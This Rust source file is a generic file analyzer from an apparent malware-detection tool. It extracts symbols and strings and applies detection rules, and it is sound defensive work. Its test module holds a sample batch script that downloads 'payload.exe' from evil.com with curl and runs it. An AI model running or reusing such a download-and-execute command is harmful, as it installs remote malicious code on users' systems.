//! Generic source code analyzer.
//!
//! Fallback analyzer for file types without dedicated analyzers.
//! Uses tree-sitter for symbol extraction where available, otherwise
//! falls back to basic text/regex-based analysis.

use crate::analyzers::symbol_extraction;
use crate::analyzers::Analyzer;
use crate::analyzers::FileType;
use crate::capabilities::CapabilityMapper;
use crate::types::*;
use anyhow::{Context, Result};
use std::fs;
use std::path::Path;
use std::sync::Arc;
use tree_sitter::Language;

/// Generic analyzer that works with any text file.
///
/// For languages with tree-sitter support, extracts symbols via AST.
/// For all files, extracts strings and runs trait matching.
#[derive(Debug)]
pub(crate) struct GenericAnalyzer {
    file_type: FileType,
    capability_mapper: Arc<CapabilityMapper>,
}

impl GenericAnalyzer {
    /// Create a new generic analyzer for the given file type
    #[must_use]
    pub(crate) fn new(file_type: FileType) -> Self {
        Self {
            file_type,
            capability_mapper: Arc::new(CapabilityMapper::empty()),
        }
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    #[must_use]
    pub(crate) fn with_capability_mapper(mut self, mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    #[must_use]
    pub(crate) fn with_capability_mapper_arc(mut self, mapper: Arc<CapabilityMapper>) -> Self {
        self.capability_mapper = mapper;
        self
    }

    /// Get tree-sitter language and call node types for this file type, if available.
    fn treesitter_config(&self) -> Option<(Language, &'static [&'static str])> {
        match self.file_type {
            FileType::Swift => Some((tree_sitter_swift::LANGUAGE.into(), &["call_expression"])),
            FileType::ObjectiveC => Some((
                tree_sitter_objc::LANGUAGE.into(),
                &["message_expression", "call_expression"],
            )),
            FileType::Groovy => Some((
                tree_sitter_groovy::LANGUAGE.into(),
                &["method_call", "function_call"],
            )),
            FileType::Scala => Some((
                tree_sitter_scala::LANGUAGE.into(),
                &["call_expression", "method_call"],
            )),
            FileType::Zig => Some((tree_sitter_zig::LANGUAGE.into(), &["call_expression"])),
            FileType::Elixir => Some((tree_sitter_elixir::LANGUAGE.into(), &["call"])),
            // No tree-sitter for these; also fallback for dedicated analyzer types
            _ => None,
        }
    }

    fn file_type_str(&self) -> &'static str {
        match self.file_type {
            FileType::Swift => "swift",
            FileType::ObjectiveC => "objc",
            FileType::Groovy => "groovy",
            FileType::Scala => "scala",
            FileType::Zig => "zig",
            FileType::Elixir => "elixir",
            FileType::Batch => "batch",
            FileType::PkgInfo => "pkg-info",
            FileType::Plist => "plist",
            _ => "unknown",
        }
    }

    /// Analyze source with pre-extracted stng strings (avoids duplicate string extraction)
    #[allow(dead_code)] // Used by binary target
    pub(crate) fn analyze_source_with_stng(
        &self,
        file_path: &Path,
        content: &str,
        stng_strings: &[stng::ExtractedString],
    ) -> AnalysisReport {
        self.analyze_source_internal(file_path, content, Some(stng_strings))
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> AnalysisReport {
        self.analyze_source_internal(file_path, content, None)
    }

    fn analyze_source_internal(
        &self,
        file_path: &Path,
        content: &str,
        stng_strings: Option<&[stng::ExtractedString]>,
    ) -> AnalysisReport {
        let start = std::time::Instant::now();
        tracing::info!(
            "GenericAnalyzer: Starting analysis of {}",
            file_path.display()
        );

        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: self.file_type_str().to_string(),
            size_bytes: content.len() as u64,
            sha256: crate::analyzers::utils::calculate_sha256(content.as_bytes()),
            architectures: None,
        };
        tracing::info!("GenericAnalyzer: Target created in {:?}", start.elapsed());

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        let (parser_name, description) = if let Some((_, _)) = self.treesitter_config() {
            (
                format!("tree-sitter-{}", self.file_type_str()),
                format!("{} source code", self.file_type_str()),
            )
        } else {
            (
                "text-analysis".to_string(),
                format!("{} file (text analysis)", self.file_type_str()),
            )
        };

        report
            .structure
            .push(crate::analyzers::utils::create_language_feature(
                self.file_type_str(),
                &parser_name,
                &description,
            ));

        // Parse with tree-sitter ONCE (don't parse multiple times for the same content)
        let t_tree = std::time::Instant::now();
        let tree = if let Some((language, node_types)) = self.treesitter_config() {
            // Parse once and reuse for symbols, imports, and strings
            let mut parser = tree_sitter::Parser::new();
            if parser.set_language(&language).is_ok() {
                if let Some(tree) = parser.parse(content, None) {
                    // Extract function calls for capability matching (type: symbol conditions)
                    symbol_extraction::extract_symbols_from_tree(
                        &tree,
                        content,
                        node_types,
                        &mut report,
                    );
                    // Also extract actual module imports for metadata/import/ findings
                    symbol_extraction::extract_imports_from_tree(
                        &tree,
                        content,
                        &self.file_type,
                        &mut report,
                    );
                    Some(tree)
                } else {
                    None
                }
            } else {
                None
            }
        } else {
            None
        };
        tracing::info!(
            "GenericAnalyzer: Tree-sitter parsing completed in {:?}",
            t_tree.elapsed()
        );

        // Extract strings (AST-based if we have a tree, stng-based otherwise)
        let t_strings = std::time::Instant::now();
        if tree.is_some() {
            // Tree-sitter available: use AST-based extraction (more accurate)
            self.extract_strings(content, tree.as_ref(), &mut report);
            tracing::info!(
                "GenericAnalyzer: Tree-sitter string extraction completed in {:?}",
                t_strings.elapsed()
            );
        } else if let Some(stng_results) = stng_strings {
            // No tree-sitter: use stng results (passed from caller)
            for es in stng_results {
                // Convert stng fragments to our format (just record offsets, we don't need to reconstruct values)
                let fragments = es.fragments.as_ref().map(|frags| {
                    frags
                        .iter()
                        .map(|f| format!("{:#x}+{}", f.offset, f.length))
                        .collect()
                });

                report.strings.push(crate::types::binary::StringInfo {
                    value: es.value.clone(),
                    offset: Some(es.data_offset),
                    string_type: match es.kind {
                        stng::StringKind::FuncName => crate::types::binary::StringType::FuncName,
                        stng::StringKind::Import => crate::types::binary::StringType::Import,
                        stng::StringKind::Url => crate::types::binary::StringType::Url,
                        stng::StringKind::Path | stng::StringKind::FilePath => {
                            crate::types::binary::StringType::Path
                        }
                        stng::StringKind::EnvVar => crate::types::binary::StringType::EnvVar,
                        _ => crate::types::binary::StringType::Const,
                    },
                    encoding: "utf-8".to_string(),
                    section: es.section.clone(),
                    encoding_chain: Vec::new(),
                    fragments,
                });
            }
            tracing::info!(
                "GenericAnalyzer: Used {} stng strings in {:?}",
                stng_results.len(),
                t_strings.elapsed()
            );
        } else {
            // No tree-sitter and no stng: fallback to regex (inefficient, shouldn't happen)
            self.extract_strings(content, tree.as_ref(), &mut report);
            tracing::warn!("GenericAnalyzer: Fallback regex string extraction in {:?} (stng strings should be passed)", t_strings.elapsed());
        }

        // Analyze embedded code in strings
        let t_embedded = std::time::Instant::now();
        let (encoded_layers, plain_findings) =
            crate::analyzers::embedded_code_detector::process_all_strings(
                &file_path.display().to_string(),
                &report.strings,
                &self.capability_mapper,
                0,
            );
        report.files.extend(encoded_layers);
        report.findings.extend(plain_findings);
        tracing::info!(
            "GenericAnalyzer: Embedded code analysis completed in {:?}",
            t_embedded.elapsed()
        );

        // Analyze paths and environment variables
        let t_paths = std::time::Instant::now();
        crate::path_mapper::analyze_and_link_paths(&mut report);
        crate::env_mapper::analyze_and_link_env_vars(&mut report);
        tracing::info!(
            "GenericAnalyzer: Path/env analysis completed in {:?}",
            t_paths.elapsed()
        );

        // Compute basic metrics
        let t_metrics = std::time::Instant::now();
        report.metrics = Some(self.compute_metrics(content));
        tracing::info!(
            "GenericAnalyzer: Metrics computed in {:?}",
            t_metrics.elapsed()
        );

        // Evaluate all rules (atomic + composite) and merge into report
        let t_eval = std::time::Instant::now();
        self.capability_mapper.evaluate_and_merge_findings(
            &mut report,
            content.as_bytes(),
            tree.as_ref(),
            None,
        );
        tracing::info!(
            "GenericAnalyzer: Rule evaluation completed in {:?}",
            t_eval.elapsed()
        );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![parser_name];

        report
    }

    fn extract_strings(
        &self,
        content: &str,
        tree: Option<&tree_sitter::Tree>,
        report: &mut AnalysisReport,
    ) {
        if let Some(tree) = tree {
            // AST-based string extraction
            self.extract_strings_ast(&tree.root_node(), content.as_bytes(), report);
        } else {
            // Regex-based string extraction for files without tree-sitter
            self.extract_strings_regex(content, report);
        }
    }

    fn extract_strings_ast<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        loop {
            let node = cursor.node();
            let kind = node.kind();

            // Common string node types across languages
            if kind.contains("string")
                || kind == "string_literal"
                || kind == "interpreted_string_literal"
                || kind == "raw_string_literal"
            {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'')
                        .trim_start_matches('`')
                        .trim_end_matches('`');
                    if !s.is_empty() && s.len() < 10000 {
                        report.strings.push(StringInfo {
                            value: s.to_string(),
                            offset: Some(node.start_byte() as u64),
                            string_type: StringType::Const,
                            encoding: "utf-8".to_string(),
                            section: Some("ast".to_string()),
                            encoding_chain: Vec::new(),
                            fragments: None,
                        });
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn extract_strings_regex(&self, content: &str, report: &mut AnalysisReport) {
        #[allow(clippy::unwrap_used)] // Static regex pattern is hardcoded and valid
        fn double_quote_re() -> &'static regex::Regex {
            static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r#""([^"\\]|\\.){0,1000}""#).unwrap())
        }
        #[allow(clippy::unwrap_used)] // Static regex pattern is hardcoded and valid
        fn single_quote_re() -> &'static regex::Regex {
            static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r#"'([^'\\]|\\.){0,1000}'"#).unwrap())
        }

        for cap in double_quote_re().find_iter(content) {
            let s = cap.as_str().trim_start_matches('"').trim_end_matches('"');
            if !s.is_empty() {
                report.strings.push(StringInfo {
                    value: s.to_string(),
                    offset: Some(cap.start() as u64),
                    string_type: StringType::Const,
                    encoding: "utf-8".to_string(),
                    section: Some("regex".to_string()),
                    encoding_chain: Vec::new(),
                    fragments: None,
                });
            }
        }

        for cap in single_quote_re().find_iter(content) {
            let s = cap.as_str().trim_start_matches('\'').trim_end_matches('\'');
            if !s.is_empty() {
                report.strings.push(StringInfo {
                    value: s.to_string(),
                    offset: Some(cap.start() as u64),
                    string_type: StringType::Const,
                    encoding: "utf-8".to_string(),
                    section: Some("regex".to_string()),
                    encoding_chain: Vec::new(),
                    fragments: None,
                });
            }
        }
    }

    fn compute_metrics(&self, content: &str) -> Metrics {
        let text = crate::analyzers::text_metrics::analyze_text(content);
        Metrics {
            text: Some(text),
            ..Default::default()
        }
    }
}

impl Analyzer for GenericAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes = fs::read(file_path).context("Failed to read file")?;
        let content = String::from_utf8_lossy(&bytes);
        Ok(self.analyze_source(file_path, &content))
    }

    fn can_analyze(&self, _file_path: &Path) -> bool {
        // Generic analyzer can attempt to analyze any file
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_generic_batch_analysis() {
        let analyzer = GenericAnalyzer::new(FileType::Batch);
        let path = PathBuf::from("test.bat");
        let code = r#"
@echo off
set PATH="%PATH%;C:\malware"
curl "http://evil.com/payload.exe" -o "payload.exe"
start payload.exe
"#;
        let report = analyzer.analyze_source(&path, code);

        // Should extract strings (quoted strings are extracted)
        assert!(!report.strings.is_empty());
        // Should have metrics
        assert!(report.metrics.is_some());
    }

    #[test]
    fn test_generic_swift_analysis() {
        let analyzer = GenericAnalyzer::new(FileType::Swift);
        let path = PathBuf::from("test.swift");
        let code = r#"
import Foundation
let url = URL(string: "http://example.com")!
let task = URLSession.shared.dataTask(with: url)
"#;
        let report = analyzer.analyze_source(&path, code);

        // Should have structural feature
        assert!(report.structure.iter().any(|s| s.id.contains("swift")));
        // Should extract strings
        assert!(!report.strings.is_empty());
    }
}
